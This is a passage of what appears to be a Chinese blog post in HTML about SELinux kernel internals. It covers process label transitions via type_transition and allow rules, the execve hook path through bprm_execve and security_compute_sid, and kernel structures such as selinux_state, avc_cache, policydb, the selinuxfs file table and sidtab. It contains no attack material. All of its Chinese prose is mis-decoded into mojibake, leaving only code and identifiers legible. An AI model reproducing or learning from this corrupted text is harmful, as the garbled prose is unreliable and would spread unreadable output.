¸å¿ƒæµç¨‹äºŒï¼šè¿›ç¨‹çš„æ ‡ç­¾è½¬æ¢</h2><p>SELinuxä¸­å­˜åœ¨ä¸€ç§è§„åˆ™type_transitionï¼Œè®©ä¸€ä¸ªå¸¦ç€æ ‡ç­¾çš„è¿›ç¨‹ï¼Œæ‰§è¡Œå¦å¤–ä¸€ä¸ªå¸¦ç€æ ‡ç­¾çš„æ–‡ä»¶æ—¶ï¼Œå‘ç”Ÿæ ‡ç­¾è½¬æ¢ï¼Œä»åŸæœ‰çš„æ ‡ç­¾è½¬æ¢æˆå…¶ä»–è®¾ç½®çš„æ ‡ç­¾ã€‚</p><p><code>type_transition unconfined_t secure_services_exec_t : process ext_gateway_t;</code></p><p><code>unconfined_t</code>çš„è¿›ç¨‹æ‰§è¡Œäº†å¸¦ç€<code>secure_services_exec_t</code>çš„æ–‡ä»¶ï¼Œè§¦å‘æ ‡ç­¾è½¬æ¢ï¼Œè¯¥æ–‡ä»¶æ‰§è¡ŒæˆåŠŸå˜æˆè¿›ç¨‹åä¸º<code>ext_gateway_t</code>ã€‚ä½†è¦çœŸæ­£çš„æ‰§è¡Œè½¬æ¢è¿˜éœ€è¦æœ‰ä¸‰ä¸ªæƒé™ï¼š</p><p>ï¼ˆ1ï¼‰<code>allow unconfined_t ext_gateway_t : process transition;</code>æ ‡ç­¾é—´çš„è½¬æ¢æƒé™</p><p>ï¼ˆ2ï¼‰<code>allow unconfined_t secure_services_exec_t : file { execute read getattr };</code>è¿›ç¨‹æ‰§è¡Œæ–‡ä»¶çš„æƒé™</p><p>ï¼ˆ3ï¼‰<code>allow ext_gateway_t secure_services_exec_t : file entrypoint;</code>è½¬æ¢æ ‡ç­¾å¿…é¡»æœ‰è¿›å…¥ç‚¹æƒé™</p><p>å› ä¸ºæ˜¯è¦æ‹‰èµ·å¦å¤–ä¸€ä¸ªè¿›ç¨‹æ‰€ä»¥å…¥å£éƒ½æ˜¯åœ¨do_execveat_commonä¸­ã€‚</p><img src="/2023/03/14/selinux-source-code-kernel-part/selinuxæ ‡ç­¾è½¬æ¢.png"><p><strong>æ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ</strong></p><p>ç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯æ£€æŸ¥è¿›ç¨‹æ ‡ç­¾è½¬æ¢çš„æ ‡ç­¾å†…å®¹</p><p>é¦–å…ˆä»ç¨‹åºæ‰§è¡Œå…¥å£å¤„è¿›å…¥<code>alloc_bprm</code>ï¼Œè¿™é‡Œä¼šåˆ†é…<code>linux_binprm</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“è®°å½•äº†äºŒè¿›åˆ¶æ‰§è¡Œç¨‹åºçš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ ¸å¿ƒçš„å‡­è¯å’Œæƒé™ï¼Œå‚æ•°ï¼Œç¯å¢ƒå˜é‡ï¼Œæ–‡ä»¶åç­‰å†…å®¹ã€‚ç»è¿‡ä¸€ç³»åˆ—çš„å­—ç¬¦ä¸²æ‹·è´å’Œå‚æ•°æ£€æŸ¥ï¼Œè¿›å…¥åˆ°<code>bprm_execve</code>æ‰§è¡Œæ–°çš„äºŒè¿›åˆ¶ç¨‹åºã€‚<code>bprm_execve</code>å‡½æ•°ä¸­æœ‰LSMçš„hookç‚¹ä½<code>security_bprm_creds_for_exec</code>ï¼Œæœ€ç»ˆè°ƒç”¨<code>selinux_bprm_creds_for_exec</code>ã€‚</p><p><code>selinux_bprm_creds_for_exec</code>ä¼šè°ƒç”¨<code>security_transition_sid</code>æ£€æŸ¥ç¨‹åºçš„æ ‡ç­¾è½¬æ¢å†…å®¹ï¼Œè€Œè¿™ä¸ªå‡½æ•°åªæ˜¯<code>security_compute_sid</code>çš„ä¸€å±‚å°è£…ï¼Œ<code>security_compute_sid</code>ä¸­ä¼šç¡®è®¤æ˜¯å¦éœ€è¦è®¡ç®—æ–°çš„sidã€‚å¤§æ¦‚åˆ†æˆä¸‹é¢çš„æµç¨‹ï¼š</p><ol><li>æœç´¢sidtabä¸­çš„ssidå’Œtsidï¼Œè·å¾—<code>scontext</code>å’Œ<code>tcontext</code>ï¼›</li><li>è®¾ç½®ç”¨æˆ·idã€è§’è‰²idå’Œæ ‡ç­¾ç±»å‹ï¼›</li><li>æ£€æŸ¥æ˜¯å¦æœ‰<code>type_transition</code>è§„åˆ™åœ¨avæ•°æ®ä¸­æˆ–è€…æ¡ä»¶avæ•°æ®ä¸­</li><li>å¦‚æœå­˜åœ¨æ ‡ç­¾è½¬æ¢ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰<code>role_transition</code>è§’è‰²è½¬æ¢ï¼Œå¹¶è®¾ç½®å¥½è§’è‰²</li><li>æ£€æŸ¥æ–°çš„æ ‡ç­¾å†…å®¹æ˜¯å¦åˆæ³•ï¼Œä¸åˆæ³•å†…å®¹å°†ä¼šè¢«æ—¥å¿—è®°å½•ï¼›</li><li>è°ƒç”¨<code>sidtab_context_to_sid</code>è·å¾—æ–°æ ‡ç­¾çš„sidï¼Œå¹¶åœ¨sidtabä¸­æ›´æ–°</li></ol><p>ç¬¬äºŒä¸ªé˜¶æ®µæ£€æŸ¥è¿›ç¨‹æ˜¯å¦æœ‰è½¬æ¢ç­‰æƒé™</p><p>ä»<code>selinux_bprm_creds_for_exec</code>ä¸­æ‰§è¡Œå®Œ<code>security_transition_sid</code>åï¼Œä¼šæœ‰è®¸å¤šçš„<code>avc_has_perm</code>å‡½æ•°ç”¨æ¥ç¡®è®¤æ˜¯å¦æœ‰ç›¸å…³çš„è½¬æ¢æƒé™ã€‚é¦–å…ˆä¼šæ£€æŸ¥ï¼Œæ˜¯å¦æœ‰<code>execute_no_trans</code>æƒé™ï¼Œæ‹¥æœ‰è¯¥æƒé™ä¼šç›´æ¥è¿”å›ï¼Œæ²¡æœ‰åˆ™ç»§ç»­æ£€æŸ¥<code>transition</code>ã€<code>entrypoint</code>ç­‰å…¶ä»–æƒé™ã€‚</p><p>ç¬¬ä¸‰ä¸ªé˜¶æ®µæ£€æŸ¥æ‰§è¡ŒäºŒè¿›åˆ¶çš„ç›¸å…³æƒé™</p><p>åœ¨å‰é¢ä¸¤ä¸ªé˜¶æ®µçš„æ£€æŸ¥ç»“æŸåï¼Œä¼šè¿”å›åˆ°<code>bprm_execve</code>ä¸­ç»§ç»­æ‰§è¡Œåˆ°<code>exec_binprm</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>search_binary_handler</code>å¯»æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åº”çš„å¤„ç†å™¨ï¼Œå¹¶åœ¨å¤„ç†å…¶ä¸­æ‰§è¡Œå®ƒçš„<code>.load_binary</code>å‡½æ•°æŒ‡é’ˆæ‰§è¡Œåˆ°<code>load_xxx_binary</code>ä¸­ï¼Œè¿™äº›å‡½æ•°æœ€åçš„å…¥å£ç‚¹åœ¨<code>begin_new_exec</code>ã€‚</p><p><code>begin_new_exec</code>ä¼šåœ¨æœ€åæ‰§è¡Œ<code>security_bprm_committing_creds</code>å’Œ<code>security_bprm_committed_creds</code>è¿™ä¸¤ä¸ªhookç‚¹å¯¹åº”ï¼Œ<code>selinux_bprm_committing_creds</code>å’Œ<code>selinux_bprm_committed_creds</code>ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°ç”¨äºè¿›ç¨‹åˆå§‹åŒ–å‡­è¯ï¼Œè¿™é‡Œä¼šæ£€æŸ¥æ˜¯å¦æœ‰æƒé™é™åˆ¶ï¼Œç¬¬äºŒä¸ªå‡½æ•°é’ˆå¯¹ä¸ä¼šç»§æ‰¿ä¿¡å·çŠ¶æ€çš„è¿›ç¨‹åšä¿¡å·æ¸…é™¤ã€‚</p><h2 id="æ ¸å¿ƒæ•°æ®å’Œæ¥å£"><a href="#æ ¸å¿ƒæ•°æ®å’Œæ¥å£" class="headerlink" title="æ ¸å¿ƒæ•°æ®å’Œæ¥å£"></a>æ ¸å¿ƒæ•°æ®å’Œæ¥å£</h2><h3 id="SELinuxçŠ¶æ€ä¿¡æ¯çš„å…¨å±€å˜é‡"><a href="#SELinuxçŠ¶æ€ä¿¡æ¯çš„å…¨å±€å˜é‡" class="headerlink" title="SELinuxçŠ¶æ€ä¿¡æ¯çš„å…¨å±€å˜é‡"></a>SELinuxçŠ¶æ€ä¿¡æ¯çš„å…¨å±€å˜é‡</h3><p><code>struct selinux_state selinux_state;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selinux_state</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DISABLE</span></span><br><span class="line"><span class="keyword">bool</span> disabled;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="keyword">bool</span> enforcing;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">bool</span> checkreqprot;</span><br><span class="line"><span class="keyword">bool</span> initialized;</span><br><span class="line"><span class="keyword">bool</span> policycap[__POLICYDB_CAP_MAX];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">status_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">status_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selinux_avc</span> *<span class="title">avc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selinux_policy</span> __<span class="title">rcu</span> *<span class="title">policy</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">policy_mutex</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªè®°å½•SELinuxçš„å…¨å±€çŠ¶æ€çš„ç»“æ„ä½“ï¼Œé‡Œé¢åŒ…æ‹¬äº†SELinuxçš„å¼€å¯çŠ¶æ€ï¼Œæ˜¯å¦ä¸ºenforcingæ¨¡å¼ï¼Œæ˜¯å¦åˆå§‹åŒ–ï¼Œè§„åˆ™æŒ‡é’ˆï¼Œavcè®°å½•ç¼“å­˜æŒ‡é’ˆç­‰ä¿¡æ¯ã€‚</p><h3 id="hooksæŒ‚è½½å‡½æ•°è¡¨"><a href="#hooksæŒ‚è½½å‡½æ•°è¡¨" class="headerlink" title="hooksæŒ‚è½½å‡½æ•°è¡¨"></a>hooksæŒ‚è½½å‡½æ•°è¡¨</h3><p>hooksæŒ‚è½½éƒ½åœ¨hooks.cæ–‡ä»¶ä¸­ï¼ŒæŠŠSELinuxçš„æ£€æŸ¥å‡½æ•°æŒ‚è½½åœ¨ä¸åŒç³»ç»Ÿè°ƒç”¨çš„å®‰å…¨å‡½æ•°hookç‚¹ä¸­ã€‚</p><p><code>static struct security_hook_list selinux_hooks[] __lsm_ro_after_init</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">LSM_HOOK_INIT(inode_create, selinux_inode_create),</span><br><span class="line">LSM_HOOK_INIT(inode_link, selinux_inode_link),</span><br><span class="line">LSM_HOOK_INIT(inode_unlink, selinux_inode_unlink),</span><br><span class="line">LSM_HOOK_INIT(inode_symlink, selinux_inode_symlink),</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="avæ•°æ®ç®¡ç†"><a href="#avæ•°æ®ç®¡ç†" class="headerlink" title="avæ•°æ®ç®¡ç†"></a>avæ•°æ®ç®¡ç†</h3><p>ç®¡ç†avæ•°æ®çš„ç›¸å…³ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selinux_avc</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> avc_cache_threshold;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_cache</span> <span class="title">avc_cache</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span><span class="title">slots</span>[<span class="title">AVC_CACHE_SLOTS</span>];</span> <span class="comment">/* head for avc_node-&gt;list */</span></span><br><span class="line"><span class="keyword">spinlock_t</span>slots_lock[AVC_CACHE_SLOTS]; <span class="comment">/* lock for writes */</span></span><br><span class="line"><span class="keyword">atomic_t</span>lru_hint;<span class="comment">/* LRU hint for reclaim scan */</span></span><br><span class="line"><span class="keyword">atomic_t</span>active_nodes;</span><br><span class="line">u32latest_notif;<span class="comment">/* latest revocation notification */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_node</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_entry</span><span class="title">ae</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span><span class="title">list</span>;</span> <span class="comment">/* anchored in avc_cache-&gt;slots[i] */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rhead</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_entry</span> &#123;</span></span><br><span class="line">u32ssid;</span><br><span class="line">u32tsid;</span><br><span class="line">u16tclass;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">av_decision</span><span class="title">avd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avc_xperms_node</span>*<span class="title">xp_node</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">av_decision</span> &#123;</span></span><br><span class="line">u32 allowed;</span><br><span class="line">u32 auditallow;</span><br><span class="line">u32 auditdeny;</span><br><span class="line">u32 seqno;</span><br><span class="line">u32 flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>selinux_avc-&gt;avc_cache.slotsæ˜¯æŒ‚ç€avc_nodeçš„listã€‚è€Œavc_codeçš„aeç®¡ç†ç€åŸºæœ¬çš„è¯·æ±‚æºå’Œç›®æ ‡å¯¹è±¡çš„idå€¼ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªidèƒ½æ‰¾åˆ°å¯¹åº”çš„æ ‡ç­¾ï¼Œavdåˆ™æ˜¯è®°å½•è¯·æ±‚çš„æƒé™ã€‚</p><h3 id="ç­–ç•¥æ•°æ®ç®¡ç†"><a href="#ç­–ç•¥æ•°æ®ç®¡ç†" class="headerlink" title="ç­–ç•¥æ•°æ®ç®¡ç†"></a>ç­–ç•¥æ•°æ®ç®¡ç†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The policy database */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">policydb</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> mls_enabled;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol tables */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">symtab</span> <span class="title">symtab</span>[<span class="title">SYM_NUM</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_commons symtab[SYM_COMMONS]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_classes symtab[SYM_CLASSES]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_roles symtab[SYM_ROLES]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_types symtab[SYM_TYPES]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_users symtab[SYM_USERS]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_bools symtab[SYM_BOOLS]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_levels symtab[SYM_LEVELS]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p_cats symtab[SYM_CATS]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol names indexed by (value - 1) */</span></span><br><span class="line"><span class="keyword">char</span>**sym_val_to_name[SYM_NUM];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* class, role, and user attributes indexed by (value - 1) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class_datum</span> **<span class="title">class_val_to_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">role_datum</span> **<span class="title">role_val_to_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_datum</span> **<span class="title">user_val_to_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">type_datum</span> **<span class="title">type_val_to_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* type enforcement access vectors and transitions */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avtab</span> <span class="title">te_avtab</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* role transitions */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hashtab</span> <span class="title">role_tr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* file transitions with the last path component */</span></span><br><span class="line"><span class="comment">/* quickly exclude lookups when parent ttype has no rules */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ebitmap</span> <span class="title">filename_trans_ttypes</span>;</span></span><br><span class="line"><span class="comment">/* actual set of filename_trans rules */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hashtab</span> <span class="title">filename_trans</span>;</span></span><br><span class="line"><span class="comment">/* only used if policyvers &lt; POLICYDB_VERSION_COMP_FTRANS */</span></span><br><span class="line">u32 compat_filename_trans_count;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bools indexed by (value - 1) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond_bool_datum</span> **<span class="title">bool_val_to_struct</span>;</span></span><br><span class="line"><span class="comment">/* type enforcement conditional access vectors and transitions */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">avtab</span> <span class="title">te_cond_avtab</span>;</span></span><br><span class="line"><span class="comment">/* array indexing te_cond_avtab by conditional */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond_node</span> *<span class="title">cond_list</span>;</span></span><br><span class="line">u32 cond_list_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* role allows */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">role_allow</span> *<span class="title">role_allow</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* security contexts of initial SIDs, unlabeled file systems,</span></span><br><span class="line"><span class="comment">   TCP or UDP port numbers, network interfaces and nodes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ocontext</span> *<span class="title">ocontexts</span>[<span class="title">OCON_NUM</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* security contexts for files in filesystems that cannot support</span></span><br><span class="line"><span class="comment">   a persistent label mapping or use another</span></span><br><span class="line"><span class="comment">   fixed labeling behavior. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">genfs</span> *<span class="title">genfs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* range transitions table (range_trans_key -&gt; mls_range) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hashtab</span> <span class="title">range_tr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* type -&gt; attribute reverse mapping */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ebitmap</span> *<span class="title">type_attr_map_array</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ebitmap</span> <span class="title">policycaps</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ebitmap</span> <span class="title">permissive_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length of this policy when it was loaded */</span></span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> policyvers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> reject_unknown : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> allow_unknown : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">u16 process_class;</span><br><span class="line">u32 process_trans_perms;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒå…³é”®çš„æˆå‘˜æ˜¯ä¸¤ä¸ªavtabï¼Œé‡Œé¢è®°å½•äº†avç›¸å…³çš„æ•°æ®å†…å®¹ï¼Œç”¨äºè®¡ç®—è®¿é—®æƒé™ã€‚</p><h3 id="selinuxfså¯¹å¤–æ¥å£"><a href="#selinuxfså¯¹å¤–æ¥å£" class="headerlink" title="selinuxfså¯¹å¤–æ¥å£"></a>selinuxfså¯¹å¤–æ¥å£</h3><p>SELinuxæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶æ¥å£ï¼Œç”¨æˆ·æ€é€šè¿‡è¿™äº›æ¥å£ä¸å†…æ ¸åŠŸèƒ½äº¤äº’ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree_descr</span> <span class="title">selinux_files</span>[] = &#123;</span></span><br><span class="line">[SEL_LOAD] = &#123;<span class="string">"load"</span>, &amp;sel_load_ops, S_IRUSR|S_IWUSR&#125;,</span><br><span class="line">[SEL_ENFORCE] = &#123;<span class="string">"enforce"</span>, &amp;sel_enforce_ops, S_IRUGO|S_IWUSR&#125;,</span><br><span class="line">[SEL_CONTEXT] = &#123;<span class="string">"context"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_ACCESS] = &#123;<span class="string">"access"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_CREATE] = &#123;<span class="string">"create"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_RELABEL] = &#123;<span class="string">"relabel"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_USER] = &#123;<span class="string">"user"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_POLICYVERS] = &#123;<span class="string">"policyvers"</span>, &amp;sel_policyvers_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_COMMIT_BOOLS] = &#123;<span class="string">"commit_pending_bools"</span>, &amp;sel_commit_bools_ops, S_IWUSR&#125;,</span><br><span class="line">[SEL_MLS] = &#123;<span class="string">"mls"</span>, &amp;sel_mls_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_DISABLE] = &#123;<span class="string">"disable"</span>, &amp;sel_disable_ops, S_IWUSR&#125;,</span><br><span class="line">[SEL_MEMBER] = &#123;<span class="string">"member"</span>, &amp;transaction_ops, S_IRUGO|S_IWUGO&#125;,</span><br><span class="line">[SEL_CHECKREQPROT] = &#123;<span class="string">"checkreqprot"</span>, &amp;sel_checkreqprot_ops, S_IRUGO|S_IWUSR&#125;,</span><br><span class="line">[SEL_REJECT_UNKNOWN] = &#123;<span class="string">"reject_unknown"</span>, &amp;sel_handle_unknown_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_DENY_UNKNOWN] = &#123;<span class="string">"deny_unknown"</span>, &amp;sel_handle_unknown_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_STATUS] = &#123;<span class="string">"status"</span>, &amp;sel_handle_status_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_POLICY] = &#123;<span class="string">"policy"</span>, &amp;sel_policy_ops, S_IRUGO&#125;,</span><br><span class="line">[SEL_VALIDATE_TRANS] = &#123;<span class="string">"validatetrans"</span>, &amp;sel_transition_ops,</span><br><span class="line">S_IWUGO&#125;,</span><br><span class="line"><span class="comment">/* last one */</span> &#123;<span class="string">""</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="sidtabç»“æ„"><a href="#sidtabç»“æ„" class="headerlink" title="sidtabç»“æ„"></a>sidtabç»“æ„</h3><p>è®°å½•æ ‡ç­¾å†…å®¹å’Œå¯¹åº”sidå€¼ï¼Œåœ¨é‰´æƒè¿‡ç¨‹ä¸­å¯ä»¥åªé€šè¿‡sidå€¼æ‰¾åˆ°æ ‡ç­¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 